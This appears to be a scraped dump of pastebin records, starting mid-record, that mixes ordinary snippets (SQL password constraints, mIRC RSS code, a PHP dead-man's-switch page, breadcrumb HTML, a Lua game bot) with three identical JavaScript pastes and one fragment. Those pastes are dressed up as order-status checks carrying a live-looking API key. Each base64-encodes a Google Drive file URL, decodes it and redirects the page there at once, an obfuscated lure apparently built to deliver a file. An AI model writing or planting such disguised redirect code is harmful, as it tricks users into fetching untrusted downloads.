  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Mn9E1xmZ,Copiar em Aula,Ninbo,JavaScript,Tuesday 25th of March 2025 10:57:45 AM CDT,"ALTER TABLE pastebin.""USER"" 
	ADD CONSTRAINT nome_maior_4 CHECK (LENGTH(nome) >= 4),
	ADD CONSTRAINT email_maior_10 check (LENGTH(email) >= 10),
	ADD CONSTRAINT password_has_needed_chars CHECK (
		(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[A-Z]', '', 'g'))) >= 2 AND
    	(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[a-z]', '', 'g'))) >= 4 AND
    	(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[0-9]', '', 'g'))) >= 3 AND
    	(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[!""#$%\/()""=?»«~^\\\.-_:.;,]', '', 'g'))) >= 2
	)
;"
DtJAHJm2,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:54:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/521/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
De1CtkTP,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:42:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/393/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
atCgmkyu,RSS,Tiago_f,mIRC,Tuesday 25th of March 2025 10:37:15 AM CDT,"    elseif ($devent == sclick) {
    if ($did == 6) {
      if ($did(3)) && ($did(4)) {
        var %u = $replace($did(4),$chr(32),% $+ 20)
        if (%rss.edit) {
          var %n = $encode($did(3),m),%v = $cell(feedr,3,1)),%e = %v $+ $chr(1) $+ *
          while ($hfind(rssdone,%e,1,w)) {
            var %i = $v1
            hadd rssdone $+(%n,$chr(1),$wd(%i,2,1)) 1
            hdel rssdone %i
          }
          hadd rssdone SHA1: $+ %n $hget(rssdone,SHA1: $+ %v)
          hdel rssdone SHA1: $+ %v
          hadd rss %u $calc($wd($did(feedr,3).seltext,5,32) -1) $did(3)
          hdel rss %rss.edit
          did -co feedr 3 $did(feedr,3).sel 1 +fs 0 0 $wd($did(feedr,3).seltext,5,32) $did(3) $+ 	+ 0 0 0 %u
        }
        elseif ($hget(rss,%u) != $null) { idialog The %u URL already exists! }
        else {
          hadd rss %u 0 $did(3)
          mdxunsel feedr 3
          did -ac feedr 3 1 + 0 0 1 $did(3) $+ 	+ 0 0 0 %u
        }
        hsave -ob rss $_tabdir(rss.tbl)
        did $iif($did(feedr,3).sel,-e,-b) feedr 6,8,24,26
        did $iif($did(feedr,3).lines >= 1,-e,-b) feedr 7
      }
      else { beep.error | halt }
    }
  }"
mE4aNii4,dmsr.php,somdcomputerguy,PHP,Tuesday 25th of March 2025 10:33:44 AM CDT,"<? require_once('common.php'); checkUser(); ?>
<!DOCTYPE html>
<html><head>
<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>
<meta http-equiv='Content-Language' content='EN'>
<meta name=""viewport"" content=""width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no"">
<title>DMS</title>
<style>
body {
  font-size: 1.3em;
  font-size-adjust: from-font;
  font-variant: small-caps;
  color: orange;
  background: rgba(0, 0, 0, 1);
}

button {
  margin: 1px;
  padding: 3px 5px;
  font-size: 12px;
  border-radius: 3px;
}
</style></head><body>
<center><br><br><div id='dateTime'></div>
<script src='dtscript.js'></script>

<?
if(isset($_GET['hgen'])) { hgenesis(); }
if(isset($_GET['update'])) { update(); }
if(isset($_GET['logout'])) { logoutUser(); }

date_default_timezone_set('America/New_York');

$CurrenTime = time();
$FinalTime  = '+25 days 25 minutes';
$FinalFile  = 'dmsr.txt';
$datestr   = ""l\, F j\<\s\u\p\>\<\s\m\a\l\l\>S\<\/\s\m\a\l\l\>\<\/\s\u\p\> Y g\:i A"";

if(!file_exists($FinalFile)) { file_put_contents($FinalFile, $CurrenTime); }

$FinalCon = file_get_contents($FinalFile); $FinalConStr = date($datestr, $FinalCon);

echo ""<br>Switch closed $FinalConStr<br><br>Update by "" .  date ($datestr, strtotime($FinalTime, $FinalCon));

if(strtotime($FinalTime, $FinalCon) < $CurrenTime){
	echo ""<br><br><strong>Deadline!</strong><br>"";
	//unlink($FinalFile);
	// mailer();
	}

if ((isset($_SESSION['validUser'])) && ($_SESSION['validUser'] == true)){
echo ""<br><br><button onclick=window.location.replace('?logout')>Log out</button>&ensp;&ensp;<button onclick=window.location.replace('?update')>Update</button>""; } else {echo ""<br><br><button onclick=window.location.replace('login.php')>Logged out</button>&ensp;&ensp;"";
if(strtotime($FinalTime, $FinalCon) < $CurrenTime){echo ""&ensp;&ensp;<button onclick=window.location.replace('?hgen')>HGenesis</button>"";}
}

function update(){
	if ((isset($_SESSION['validUser'])) && ($_SESSION['validUser'] == true)){
	date_default_timezone_set('America/New_York');
	
	$CurrenTime = time();
    $FinalFile  = 'dmsr.txt'; $NotifyFile = 'dmsr_notify.txt';

	file_put_contents($FinalFile, $CurrenTime); echo ""<script>location.href = 'dmsr.php'</script>"";
}}

function hgenesis(){
	if ((isset($_SESSION['validUser'])) && ($_SESSION['validUser'] == true)){
		$FinalFile  = 'dmsr.txt';
		unlink($FinalFile);
		echo ""<script>location.href = 'dmsr.php'</script>"";
}}

function mailer(){
$subject = ""DMS Notifier"";
$message = ""Hey now. <a href='https://gowansb.powweb.com/dms/dmsr.php'>Login if you have to and check if you want to</a>."";
$mailto  = """";
$headers = ""From: "";

mail(""$mailto"", ""$subject"" , ""$message"", ""$headers"");
}

?></center></body></html>"
Erzxxp0A,Insights Breadcrumbs - Inline,Aleso1,JavaScript,Tuesday 25th of March 2025 10:30:50 AM CDT,"<nav aria-label=""Breadcrumb"">
  <ul class=""breadcrumbs"" itemscope itemtype=""https://schema.org/BreadcrumbList"" style=""display:flex; flex-wrap:wrap; align-items:center; gap:6px; font-size:14px; list-style:none; padding:0; margin:0;"">
    
    <li itemprop=""itemListElement"" itemscope itemtype=""https://schema.org/ListItem"" style=""display:flex; align-items:center;"">
      <a href=""https://www.ie.edu/insights/"" itemprop=""item"" style=""text-decoration:none; color:#0073e6;"">
        <span itemprop=""name"">Home</span>
      </a>
      <meta itemprop=""position"" content=""1"" />
    </li>

    <li style=""display:flex; align-items:center;"">»</li>

    <li itemprop=""itemListElement"" itemscope itemtype=""https://schema.org/ListItem"" style=""display:flex; align-items:center;"">
      <a href=""https://www.ie.edu/insights/articles/"" itemprop=""item"" style=""text-decoration:none; color:#0073e6;"">
        <span itemprop=""name"">Articles</span>
      </a>
      <meta itemprop=""position"" content=""2"" />
    </li>

    <li style=""display:flex; align-items:center;"">»</li>

    <li class=""current"" itemprop=""itemListElement"" itemscope itemtype=""https://schema.org/ListItem"" style=""display:flex; align-items:center; color:#333;"">
      <span itemprop=""name"">Politicians Take to the Pods</span>
      <meta itemprop=""position"" content=""3"" />
    </li>

  </ul>
</nav>
"
QQSYebyW,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:30:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/206/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RHG99pER,Hireling CaveBot Dialog,martintokio,Lua,Tuesday 25th of March 2025 10:19:48 AM CDT,"--Hireling Dialog
local hireling_settings = {
    dish_name = ""Carrion Casserole"",
    dish_id = 29414,
    dish_amount = 10,
    hireling_name = ""Otclient""
}

function get_item_count(itemId)
    local count = 0
    for _, container in pairs(g_game.getContainers()) do
        for _, item in ipairs(container:getItems()) do
            if item:getId() == itemId then
                count = count + item:getCount()
            end
        end
    end
    for _, item in ipairs(player:getItems()) do
        if item:getId() == itemId then
            count = count + item:getCount()
        end
    end
    return count
end

function check_purse()
    local purse = getContainerByName(""Store inbox"")
    if not purse then
        g_game.use(g_game.getLocalPlayer():getInventoryItem(InventorySlotPurse))
    end
end

function talk_hireling()
    check_purse()
    CaveBot.Conversation(""hi"")
    schedule(200, function()
        check_purse()
        CaveBot.Conversation(""food"")
    end)
    schedule(400, function()
        check_purse()
        CaveBot.Conversation(""specific"")
    end)
    schedule(800, function()
        check_purse()
        CaveBot.Conversation(hireling_settings.dish_name)
    end)
    schedule(1200, function()
        check_purse()
        CaveBot.Conversation(""yes"")
    end)
    
    schedule(1600, function()
        if get_item_count(hireling_settings.dish_id) < hireling_settings.dish_amount then
            check_and_buy()
        end
    end)
end

function buy_hireling()
    local hireling = getCreatureByName(hireling_settings.hireling_name)
    if not hireling then
        print(""CaveBot[follow]: can't find hireling to follow"")
        return
    end

    local hireling_pos = hireling:getPosition()
    local pos = pos()

    if getDistanceBetween(hireling_pos, pos) > 2 then
        follow(hireling)
        schedule(1000, buy_hireling)
        return
    end

    g_game.cancelFollow()
    talk_hireling()
end

function check_and_buy()
    check_purse()

    if get_item_count(hireling_settings.dish_id) < hireling_settings.dish_amount then
        buy_hireling()
    end
end

check_and_buy()
return true"
